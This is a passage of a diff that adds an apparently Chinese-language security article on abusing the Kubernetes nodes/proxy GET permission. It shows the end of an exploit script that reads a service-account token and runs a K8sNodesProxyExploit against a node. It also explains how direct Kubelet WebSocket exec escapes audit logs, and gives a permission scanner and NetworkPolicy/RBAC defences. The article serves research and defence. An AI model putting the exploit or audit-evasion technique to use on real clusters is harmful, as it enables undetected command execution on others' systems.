+            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">token_path</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+                <span class="n">token</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">token</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] No token found&quot;</span><span class="p">)</span>
+        <span class="k">return</span>
+
+    <span class="n">node_ip</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;NODE_IP&quot;</span><span class="p">,</span> <span class="s2">&quot;10.0.0.10&quot;</span><span class="p">)</span>
+
+    <span class="n">exploit</span> <span class="o">=</span> <span class="n">K8sNodesProxyExploit</span><span class="p">(</span><span class="n">token</span><span class="o">=</span><span class="n">token</span><span class="p">,</span> <span class="n">node_ip</span><span class="o">=</span><span class="n">node_ip</span><span class="p">)</span>
+    <span class="k">await</span> <span class="n">exploit</span><span class="o">.</span><span class="n">run_exploit</span><span class="p">()</span>
+
+<span class="c1"># asyncio.run(main())</span>
+</code></pre></div>
+
+<hr />
+<h2>4. 隐蔽性分析</h2>
+<h3>4.1 审计日志盲区</h3>
+<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">两条路径的审计日志差异对比</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="n">audit_comparison</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
+<span class="s2">┌──────────────────────────────────────────────────────────────────┐</span>
+<span class="s2">│               审计日志对比                                         │</span>
+<span class="s2">│                                                                  │</span>
+<span class="s2">│  路径 A: API Server Proxy                                        │</span>
+<span class="s2">│  ┌────────────────────────────────────────────────────┐         │</span>
+<span class="s2">│  │ 审计日志记录:                                       │         │</span>
+<span class="s2">│  │ • verb: create                                     │         │</span>
+<span class="s2">│  │ • resource: nodes/proxy                            │         │</span>
+<span class="s2">│  │ • subresource: exec                                │         │</span>
+<span class="s2">│  │ • requestURI: /api/v1/nodes/node1/proxy/exec/...   │         │</span>
+<span class="s2">│  │ • 完整命令参数可见 ✓                                │         │</span>
+<span class="s2">│  │ • pods/exec 审计记录生成 ✓                         │         │</span>
+<span class="s2">│  │ • subjectaccessreviews 记录 ✓                     │         │</span>
+<span class="s2">│  └────────────────────────────────────────────────────┘         │</span>
+<span class="s2">│  → 蓝队可以看到: 谁在哪个 Pod 执行了什么命令                      │</span>
+<span class="s2">│                                                                  │</span>
+<span class="s2">│  路径 B: WebSocket 直连 Kubelet                                  │</span>
+<span class="s2">│  ┌────────────────────────────────────────────────────┐         │</span>
+<span class="s2">│  │ 审计日志记录:                                       │         │</span>
+<span class="s2">│  │ • verb: get                                        │         │</span>
+<span class="s2">│  │ • resource: nodes/proxy                            │         │</span>
+<span class="s2">│  │ • requestURI: /exec/kube-system/kube-proxy/...     │         │</span>
+<span class="s2">│  │ • 命令参数: 不记录 ✗                                │         │</span>
+<span class="s2">│  │ • pods/exec 审计记录: 不生成 ✗                     │         │</span>
+<span class="s2">│  │ • subjectaccessreviews 记录: 有 (但只有 verb=get)  │         │</span>
+<span class="s2">│  └────────────────────────────────────────────────────┘         │</span>
+<span class="s2">│  → 蓝队只能看到: 某用户 GET 了 nodes/proxy                        │</span>
+<span class="s2">│  → 看不到执行了什么命令, 在哪个 Pod 执行                          │</span>
+<span class="s2">│  → 看起来像是正常的监控请求!                                      │</span>
+<span class="s2">│                                                                  │</span>
+<span class="s2">│  Graham Helton 原文:                                             │</span>
+<span class="s2">│  &quot;Kubernetes AuditPolicy does not log commands executed          │</span>
+<span class="s2">│   through a direct connection to the Kubelet API&quot;                │</span>
+<span class="s2">└──────────────────────────────────────────────────────────────────┘</span>
+<span class="s2">&quot;&quot;&quot;</span>
+</code></pre></div>
+
+<h3>4.2 检测困难点</h3>
+<table>
+<thead>
+<tr>
+<th>检测方法</th>
+<th>路径 A (API Server)</th>
+<th>路径 B (WebSocket 直连)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>K8s Audit Log</td>
+<td>✓ 完整记录命令</td>
+<td>✗ 仅 subjectaccessreviews</td>
+</tr>
+<tr>
+<td>pods/exec 审计</td>
+<td>✓ 生成</td>
+<td>✗ 不生成</td>
+</tr>
+<tr>
+<td>命令内容</td>
+<td>✓ 可见</td>
+<td>✗ 不可见</td>
+</tr>
+<tr>
+<td>请求来源</td>
+<td>✓ API Server IP</td>
+<td>✗ 直接来自 Pod IP</td>
+</tr>
+<tr>
+<td>NetworkPolicy</td>
+<td>✓ 可限制</td>
+<td>需额外配置限制 10250</td>
+</tr>
+<tr>
+<td>Falco</td>
+<td>✓ 可检测</td>
+<td>需检测 10250 端口连接</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>5. 攻击面测绘</h2>
+<h3>5.1 受影响的 Helm Chart</h3>
+<p>Graham Helton 扫描发现 69 个 Helm Chart 包含 <code>nodes/proxy</code> GET 权限。常见的受影响组件：</p>
+<table>
+<thead>
+<tr>
+<th>组件类型</th>
+<th>示例</th>
+<th>为什么有 nodes/proxy GET</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>监控组件</td>
+<td>Prometheus Node Exporter</td>
+<td>读取节点 metrics</td>
+</tr>
+<tr>
+<td>日志收集</td>
+<td>Fluentd, Filebeat</td>
+<td>读取容器日志</td>
+</tr>
+<tr>
+<td>网络插件</td>
+<td>Calico, Cilium</td>
+<td>读取网络状态</td>
+</tr>
+<tr>
+<td>存储插件</td>
+<td>CSI drivers</td>
+<td>读取存储状态</td>
+</tr>
+<tr>
+<td>安全代理</td>
+<td>Datadog Agent, Sysdig</td>
+<td>全面监控</td>
+</tr>
+</tbody>
+</table>
+<h3>5.2 集群扫描脚本</h3>
+<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
+<span class="sd">扫描集群中所有拥有 nodes/proxy 权限的 ServiceAccount</span>
+<span class="sd">&quot;&quot;&quot;</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
+
+<span class="k">class</span><span class="w"> </span><span class="nc">NodesProxyScanner</span><span class="p">:</span>
+<span class="w">    </span><span class="sd">&quot;&quot;&quot;扫描 nodes/proxy 权限分配&quot;&quot;&quot;</span>
+
+    <span class="nd">@staticmethod</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">scan_clusterrole_bindings</span><span class="p">():</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;扫描 ClusterRoleBinding 中的 nodes/proxy 权限&quot;&quot;&quot;</span>
+        <span class="c1"># 获取所有 ClusterRole</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+            <span class="p">[</span><span class="s2">&quot;kubectl&quot;</span><span class="p">,</span> <span class="s2">&quot;get&quot;</span><span class="p">,</span> <span class="s2">&quot;clusterroles&quot;</span><span class="p">,</span> <span class="s2">&quot;-o&quot;</span><span class="p">,</span> <span class="s2">&quot;json&quot;</span><span class="p">],</span>
+            <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
+        <span class="p">)</span>
+        <span class="n">roles</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="p">)</span>
+
+        <span class="n">vulnerable_roles</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">for</span> <span class="n">role</span> <span class="ow">in</span> <span class="n">roles</span><span class="p">[</span><span class="s2">&quot;items&quot;</span><span class="p">]:</span>
+            <span class="n">rules</span> <span class="o">=</span> <span class="n">role</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;rules&quot;</span><span class="p">,</span> <span class="p">[])</span>
+            <span class="k">for</span> <span class="n">rule</span> <span class="ow">in</span> <span class="n">rules</span><span class="p">:</span>
+                <span class="n">resources</span> <span class="o">=</span> <span class="n">rule</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;resources&quot;</span><span class="p">,</span> <span class="p">[])</span>
+                <span class="n">verbs</span> <span class="o">=</span> <span class="n">rule</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;verbs&quot;</span><span class="p">,</span> <span class="p">[])</span>
+
+                <span class="k">if</span> <span class="s2">&quot;nodes/proxy&quot;</span> <span class="ow">in</span> <span class="n">resources</span> <span class="ow">and</span> <span class="s2">&quot;get&quot;</span> <span class="ow">in</span> <span class="n">verbs</span><span class="p">:</span>
+                    <span class="n">vulnerable_roles</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
+                        <span class="s2">&quot;role_name&quot;</span><span class="p">:</span> <span class="n">role</span><span class="p">[</span><span class="s2">&quot;metadata&quot;</span><span class="p">][</span><span class="s2">&quot;name&quot;</span><span class="p">],</span>
+                        <span class="s2">&quot;verbs&quot;</span><span class="p">:</span> <span class="n">verbs</span><span class="p">,</span>
+                        <span class="s2">&quot;resources&quot;</span><span class="p">:</span> <span class="n">resources</span><span class="p">,</span>
+                        <span class="s2">&quot;risk&quot;</span><span class="p">:</span> <span class="s2">&quot;HIGH&quot;</span> <span class="k">if</span> <span class="s2">&quot;get&quot;</span> <span class="ow">in</span> <span class="n">verbs</span> <span class="k">else</span> <span class="s2">&quot;CRITICAL&quot;</span>
+                    <span class="p">})</span>
+
+        <span class="k">return</span> <span class="n">vulnerable_roles</span>
+
+    <span class="nd">@staticmethod</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">scan_role_bindings</span><span class="p">():</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;扫描哪些 ServiceAccount 绑定了有 nodes/proxy 权限的 Role&quot;&quot;&quot;</span>
+        <span class="n">vulnerable_roles</span> <span class="o">=</span> <span class="n">NodesProxyScanner</span><span class="o">.</span><span class="n">scan_clusterrole_bindings</span><span class="p">()</span>
+        <span class="n">vulnerable_role_names</span> <span class="o">=</span> <span class="p">[</span><span class="n">r</span><span class="p">[</span><span class="s2">&quot;role_name&quot;</span><span class="p">]</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">vulnerable_roles</span><span class="p">]</span>
+
+        <span class="c1"># 检查 ClusterRoleBinding</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+            <span class="p">[</span><span class="s2">&quot;kubectl&quot;</span><span class="p">,</span> <span class="s2">&quot;get&quot;</span><span class="p">,</span> <span class="s2">&quot;clusterrolebindings&quot;</span><span class="p">,</span> <span class="s2">&quot;-o&quot;</span><span class="p">,</span> <span class="s2">&quot;json&quot;</span><span class="p">],</span>
+            <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
+        <span class="p">)</span>
+        <span class="n">bindings</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="p">)</span>
+
+        <span class="n">affected_sas</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">for</span> <span class="n">binding</span> <span class="ow">in</span> <span class="n">bindings</span><span class="p">[</span><span class="s2">&quot;items&quot;</span><span class="p">]:</span>
+            <span class="n">role_ref</span> <span class="o">=</span> <span class="n">binding</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;roleRef&quot;</span><span class="p">,</span> <span class="p">{})</span>
+            <span class="k">if</span> <span class="n">role_ref</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;name&quot;</span><span class="p">)</span> <span class="ow">in</span> <span class="n">vulnerable_role_names</span><span class="p">:</span>
+                <span class="n">subjects</span> <span class="o">=</span> <span class="n">binding</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;subjects&quot;</span><span class="p">,</span> <span class="p">[])</span>
+                <span class="k">for</span> <span class="n">subject</span> <span class="ow">in</span> <span class="n">subjects</span><span class="p">:</span>
+                    <span class="k">if</span> <span class="n">subject</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;kind&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;ServiceAccount&quot;</span><span class="p">:</span>
+                        <span class="n">affected_sas</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
+                            <span class="s2">&quot;service_account&quot;</span><span class="p">:</span> <span class="n">subject</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">],</span>
+                            <span class="s2">&quot;namespace&quot;</span><span class="p">:</span> <span class="n">subject</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;namespace&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">),</span>
+                            <span class="s2">&quot;role&quot;</span><span class="p">:</span> <span class="n">role_ref</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">],</span>
+                            <span class="s2">&quot;binding&quot;</span><span class="p">:</span> <span class="n">binding</span><span class="p">[</span><span class="s2">&quot;metadata&quot;</span><span class="p">][</span><span class="s2">&quot;name&quot;</span><span class="p">]</span>
+                        <span class="p">})</span>
+
+        <span class="k">return</span> <span class="n">affected_sas</span>
+
+    <span class="nd">@staticmethod</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">scan_helm_charts</span><span class="p">():</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;扫描已安装的 Helm Release 中的 RBAC 配置&quot;&quot;&quot;</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+            <span class="p">[</span><span class="s2">&quot;helm&quot;</span><span class="p">,</span> <span class="s2">&quot;list&quot;</span><span class="p">,</span> <span class="s2">&quot;-A&quot;</span><span class="p">,</span> <span class="s2">&quot;-o&quot;</span><span class="p">,</span> <span class="s2">&quot;json&quot;</span><span class="p">],</span>
+            <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
+        <span class="p">)</span>
+        <span class="n">releases</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="p">)</span> <span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span> <span class="k">else</span> <span class="p">[]</span>
+
+        <span class="k">for</span> <span class="n">release</span> <span class="ow">in</span> <span class="n">releases</span><span class="p">:</span>
+            <span class="n">name</span> <span class="o">=</span> <span class="n">release</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span>
+            <span class="n">namespace</span> <span class="o">=</span> <span class="n">release</span><span class="p">[</span><span class="s2">&quot;namespace&quot;</span><span class="p">]</span>
+
+            <span class="c1"># 获取 release 的 manifest</span>
+            <span class="n">manifest_result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+                <span class="p">[</span><span class="s2">&quot;helm&quot;</span><span class="p">,</span> <span class="s2">&quot;get&quot;</span><span class="p">,</span> <span class="s2">&quot;manifest&quot;</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="s2">&quot;-n&quot;</span><span class="p">,</span> <span class="n">namespace</span><span class="p">],</span>
+                <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span>
+            <span class="p">)</span>
+
+            <span class="n">manifest</span> <span class="o">=</span> <span class="n">manifest_result</span><span class="o">.</span><span class="n">stdout</span>
+            <span class="k">if</span> <span class="s2">&quot;nodes/proxy&quot;</span> <span class="ow">in</span> <span class="n">manifest</span> <span class="ow">and</span> <span class="s2">&quot;get&quot;</span> <span class="ow">in</span> <span class="n">manifest</span><span class="p">:</span>
+                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[!] Helm Release &#39;</span><span class="si">{</span><span class="n">name</span><span class="si">}</span><span class="s2">&#39; in namespace &#39;</span><span class="si">{</span><span class="n">namespace</span><span class="si">}</span><span class="s2">&#39; &quot;</span>
+                      <span class="sa">f</span><span class="s2">&quot;contains nodes/proxy GET permission!&quot;</span><span class="p">)</span>
+
+    <span class="nd">@staticmethod</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">generate_report</span><span class="p">():</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;生成完整扫描报告&quot;&quot;&quot;</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;K8s nodes/proxy GET Permission Scanner&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[*] Scanning ClusterRoles for nodes/proxy GET...&quot;</span><span class="p">)</span>
+        <span class="n">roles</span> <span class="o">=</span> <span class="n">NodesProxyScanner</span><span class="o">.</span><span class="n">scan_clusterrole_bindings</span><span class="p">()</span>
+        <span class="k">for</span> <span class="n">role</span> <span class="ow">in</span> <span class="n">roles</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    [!] </span><span class="si">{</span><span class="n">role</span><span class="p">[</span><span class="s1">&#39;role_name&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">role</span><span class="p">[</span><span class="s1">&#39;verbs&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> on </span><span class="si">{</span><span class="n">role</span><span class="p">[</span><span class="s1">&#39;resources&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[*] Found </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">roles</span><span class="p">)</span><span class="si">}</span><span class="s2"> roles with nodes/proxy GET&quot;</span><span class="p">)</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[*] Scanning ServiceAccount bindings...&quot;</span><span class="p">)</span>
+        <span class="n">sas</span> <span class="o">=</span> <span class="n">NodesProxyScanner</span><span class="o">.</span><span class="n">scan_role_bindings</span><span class="p">()</span>
+        <span class="k">for</span> <span class="n">sa</span> <span class="ow">in</span> <span class="n">sas</span><span class="p">:</span>
+            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;    [!] SA: </span><span class="si">{</span><span class="n">sa</span><span class="p">[</span><span class="s1">&#39;namespace&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">sa</span><span class="p">[</span><span class="s1">&#39;service_account&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> &quot;</span>
+                  <span class="sa">f</span><span class="s2">&quot;← </span><span class="si">{</span><span class="n">sa</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2"> (via </span><span class="si">{</span><span class="n">sa</span><span class="p">[</span><span class="s1">&#39;binding&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[*] Found </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">sas</span><span class="p">)</span><span class="si">}</span><span class="s2"> ServiceAccounts with nodes/proxy GET&quot;</span><span class="p">)</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[*] Scanning Helm releases...&quot;</span><span class="p">)</span>
+        <span class="n">NodesProxyScanner</span><span class="o">.</span><span class="n">scan_helm_charts</span><span class="p">()</span>
+
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Recommendation:&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;  1. Remove nodes/proxy GET from non-essential ServiceAccounts&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;  2. Restrict Kubelet 10250 port access via NetworkPolicy&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;  3. Monitor direct Kubelet connections (bypassing API Server)&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;  4. Wait for KEP-2862 GA in v1.36 for fine-grained permissions&quot;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">60</span><span class="p">)</span>
+
+
+<span class="c1"># 运行扫描</span>
+<span class="c1"># NodesProxyScanner.generate_report()</span>
+</code></pre></div>
+
+<hr />
+<h2>6. 防御方案</h2>
+<h3>6.1 网络层防御</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># NetworkPolicy: 限制只有 API Server 能访问 Kubelet 10250 端口</span>
+<span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">networking.k8s.io/v1</span>
+<span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">NetworkPolicy</span>
+<span class="nt">metadata</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">restrict-kubelet-access</span>
+<span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">kube-system</span>
+<span class="nt">spec</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">podSelector</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">matchLabels</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">component</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">kubelet</span>
+<span class="w">  </span><span class="nt">policyTypes</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Ingress</span>
+<span class="w">  </span><span class="nt">ingress</span><span class="p">:</span>
+<span class="w">    </span><span class="c1"># 仅允许 API Server 访问 Kubelet</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">from</span><span class="p">:</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">namespaceSelector</span><span class="p">:</span>
+<span class="w">            </span><span class="nt">matchLabels</span><span class="p">:</span>
+<span class="w">              </span><span class="nt">kubernetes.io/metadata.name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">kube-system</span>
+<span class="w">          </span><span class="nt">podSelector</span><span class="p">:</span>
+<span class="w">            </span><span class="nt">matchLabels</span><span class="p">:</span>
+<span class="w">              </span><span class="nt">component</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">kube-apiserver</span>
+<span class="w">      </span><span class="nt">ports</span><span class="p">:</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">protocol</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">TCP</span>
+<span class="w">          </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">10250</span>
+<span class="w">    </span><span class="c1"># 允许节点本地访问 (健康检查)</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">from</span><span class="p">:</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">ipBlock</span><span class="p">:</span>
+<span class="w">            </span><span class="nt">cidr</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">127.0.0.1/32</span>
+<span class="w">      </span><span class="nt">ports</span><span class="p">:</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">protocol</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">TCP</span>
+<span class="w">          </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">10250</span>
+<span class="nn">---</span>
+<span class="c1"># 阻断 Pod 到 Kubelet 10250 的直接连接</span>
+<span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">networking.k8s.io/v1</span>
+<span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">NetworkPolicy</span>
+<span class="nt">metadata</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">block-pod-to-kubelet</span>
+<span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">default</span>
+<span class="nt">spec</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">podSelector</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">{}</span>
+<span class="w">  </span><span class="nt">policyTypes</span><span class="p">:</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Egress</span>
+<span class="w">  </span><span class="nt">egress</span><span class="p">:</span>
+<span class="w">    </span><span class="c1"># 允许所有出站，但排除 Kubelet 端口</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">to</span><span class="p">:</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">ipBlock</span><span class="p">:</span>
+<span class="w">            </span><span class="nt">cidr</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">0.0.0.0/0</span>
+<span class="w">            </span><span class="nt">except</span><span class="p">:</span>
+<span class="w">              </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">10.0.0.0/8</span><span class="w">  </span><span class="c1"># 需要根据实际网络配置调整</span>
+<span class="w">    </span><span class="c1"># 允许 DNS</span>
+<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">to</span><span class="p">:</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">namespaceSelector</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">{}</span>
+<span class="w">      </span><span class="nt">ports</span><span class="p">:</span>
+<span class="w">        </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">protocol</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">UDP</span>
+<span class="w">          </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">53</span>
+</code></pre></div>
+
+<h3>6.2 RBAC 最小权限</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># 错误: 使用 nodes/proxy (过宽的权限)</span>
+<span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">rbac.authorization.k8s.io/v1</span>
+<span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ClusterRole</span>
+<span class="nt">metadata</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">monitoring-role</span>
+<span class="nt">rules</span><span class="p">:</span>
+<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">apiGroups</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="nt">resources</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;nodes/proxy&quot;</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="nt">verbs</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&quot;get&quot;</span><span class="p p-Indicator">]</span><span class="w">  </span><span class="c1"># ← 危险! 这就是攻击入口</span>
+
+<span class="nn">---</span>
+<span class="c1"># 正确: 使用 KEP-2862 细粒度子资源 (v1.36+)</span>
+<span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">rbac.authorization.k8s.io/v1</span>
+<span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ClusterRole</span>
+<span class="nt">metadata</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">monitoring-role-safe</span>
+<span class="nt">rules</span><span class="p">:</span>
